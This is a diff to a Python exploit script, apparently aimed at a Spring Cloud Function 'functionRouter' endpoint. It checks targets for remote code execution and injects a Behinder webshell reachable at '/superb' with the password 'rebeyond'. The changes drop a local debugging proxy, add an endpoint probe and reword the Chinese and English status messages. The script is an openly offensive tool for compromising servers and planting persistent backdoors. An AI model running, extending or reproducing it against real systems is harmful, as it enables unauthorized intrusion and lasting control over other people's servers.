@@ -1,4 +1,5 @@
 # coding:utf-8
+# amazingday
 
 import requests
 import argparse
@@ -22,12 +23,18 @@ def Exploit(url):
 
     try:
         url = url + "functionRouter"
-        res = requests.post(url, headers=headers, data=data, timeout=10, allow_redirects=False, verify=False, proxies={'http':'http://127.0.0.1:8080'})
+        req = requests.post(url=url, timeout=3)
+        text = req.text
+        rsp = "Internal Server Error"
+
+        if req.status_code == 500 and rsp in text:
+            print(url + '存在接口')
+        res = requests.post(url, headers=headers, data=data, timeout=10, allow_redirects=False, verify=False)
         if res.headers.get("Content-auth"):
-            print("Exist！Find rce")
+            print("Exist！Find echo")
             print(res.headers.get("Content-auth"))
         else:
-            print("No Exist")
+            print("No Find echo，请手动确认接口是否存在漏洞")
     except Exception as e:
         print(e)
         pass
@@ -43,9 +50,9 @@ def Inject(url):
 
     try:
         posturl = url + "functionRouter"
-        requests.post(posturl, headers=headers, data=data, timeout=10, allow_redirects=False, verify=False, proxies={'http':'http://127.0.0.1:8080'})
+        requests.post(posturl, headers=headers, data=data, timeout=10, allow_redirects=False, verify=False)
         checkurl = url + "superb"
-        checkres = requests.get(checkurl, data=data, timeout=10, allow_redirects=False, verify=False, proxies={'http':'http://127.0.0.1:8080'})
+        checkres = requests.get(checkurl, data=data, timeout=10, allow_redirects=False, verify=False)
         if checkres.status_code == 500:
             print("Inject Behinder！pass:rebeyond")
             print(checkurl)
